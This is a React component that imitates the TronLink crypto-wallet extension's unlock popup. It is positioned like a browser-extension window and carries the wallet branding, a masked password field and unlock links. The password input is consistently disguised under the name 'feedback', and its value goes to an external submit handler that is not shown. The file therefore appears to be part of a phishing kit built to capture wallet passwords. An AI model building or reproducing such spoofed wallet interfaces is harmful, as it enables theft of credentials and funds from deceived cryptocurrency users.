import { EyeIcon, EyeSlashIcon } from "@heroicons/react/24/solid";
import { motion } from "motion/react";
import { useEffect, useRef, useState } from "react";
import { walletModalCopy } from "./copy";
import type { WalletModalProps } from "./types";

const TronLink = ({
  feedback,
  feedbackError,
  onFeedbackChange,
  onSubmit
}: WalletModalProps) => {
  const copy = walletModalCopy.tronlink;
  const [isFeedbackVisible, setIsFeedbackVisible] = useState(false);
  const feedbackInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (feedbackInputRef.current) {
      feedbackInputRef.current.value = "";
    }
    feedbackInputRef.current?.focus();
  }, []);

  return (
    <motion.aside
      animate={{ opacity: 1, y: 0 }}
      aria-label={copy.dialog_label}
      aria-modal="true"
      className="fixed top-0 right-[120px] z-[101] flex h-[600px] max-h-[calc(100dvh-1rem)] w-[min(365px,calc(100vw-1rem))] flex-col overflow-hidden border border-[#333] bg-white text-[#151515] shadow-md"
      exit={{ opacity: 0, y: -12 }}
      initial={{ opacity: 0, y: -12 }}
      role="dialog"
      style={{
        fontFamily: "HarmonyOS_Sans, PingFang SC, Microsoft Yahei, sans-serif"
      }}
      transition={{ duration: 0.2, ease: "easeOut" }}
    >
      <div className="relative min-h-0 flex-1 text-xs">
        <div className="pointer-events-none absolute inset-x-0 top-0 h-[360px]">
          <img
            alt={copy.subtitle}
            className="absolute top-20 left-1/2 h-[120px] w-[150px] -translate-x-1/2"
            height={120}
            src={copy.icon_src}
            width={150}
          />
        </div>
        <form className="contents" onSubmit={onSubmit}>
          <div className="absolute top-[320px] right-5 left-5 z-10">
            <input
              aria-invalid={Boolean(feedbackError)}
              aria-label={copy.feedback_label}
              autoComplete="new-password"
              className={`${feedbackError ? "border-[#ca3542] focus:border-[#ca3542]" : "border-[#293247] focus:border-[#293247]"} h-[52px] w-full rounded-md border bg-white px-4 pr-11 text-[#151515] text-xs outline-none placeholder:text-[#9ca3af] placeholder:text-sm placeholder:tracking-normal focus:placeholder-transparent focus:outline-none focus:ring-0 focus:ring-offset-0 ${isFeedbackVisible ? "" : "tracking-[0.5em]"}`}
              name="tronlink-feedback"
              onChange={(event) => onFeedbackChange(event.target.value)}
              placeholder={copy.feedback_placeholder}
              ref={feedbackInputRef}
              type={isFeedbackVisible ? "text" : "password"}
              value={feedback}
            />
            <button
              aria-label={isFeedbackVisible ? "Hide feedback" : "Show feedback"}
              aria-pressed={isFeedbackVisible}
              className="absolute top-1/2 right-3 -translate-y-1/2 text-[#98a2b3]"
              onClick={() => setIsFeedbackVisible((visible) => !visible)}
              onMouseDown={(event) => event.preventDefault()}
              type="button"
            >
              {isFeedbackVisible ? (
                <EyeIcon aria-hidden="true" className="size-[18px]" />
              ) : (
                <EyeSlashIcon aria-hidden="true" className="size-[18px]" />
              )}
            </button>
          </div>
          {feedbackError ? (
            <p
              className="absolute top-[376px] right-5 left-5 text-[#ca3542] text-xs"
              role="alert"
            >
              {feedbackError}
            </p>
          ) : null}
          <button
            className="absolute top-[402px] right-5 left-5 h-[52px] w-[calc(100%-2.5rem)] rounded-md bg-[#1a212b] font-semibold text-white text-xs transition-colors hover:bg-[#111820] disabled:cursor-not-allowed disabled:opacity-50"
            disabled={!feedback.trim()}
            type="submit"
          >
            {copy.button_txt}
          </button>
        </form>
        <div className="absolute right-0 bottom-[30px] left-0 flex h-11 flex-col items-center justify-between text-xs">
          <a
            className="text-[#9ba4b6]"
            href={copy.learn_more_url}
            rel="noopener noreferrer"
            target="_blank"
          >
            {copy.unable_to_log_in}
          </a>
          <div className="flex items-center gap-1">
            <a
              className="text-[#1a212b] underline"
              href={copy.learn_more_url}
              rel="noopener noreferrer"
              target="_blank"
            >
              {copy.unlock_in_other_ways}
            </a>
            <span className="text-[#9ba4b6]">or</span>
            <a
              className="text-[#1a212b] underline"
              href={copy.create_wallet_url}
              rel="noopener noreferrer"
              target="_blank"
            >
              {copy.create_new_wallet}
            </a>
          </div>
        </div>
      </div>
    </motion.aside>
  );
};

export default TronLink;
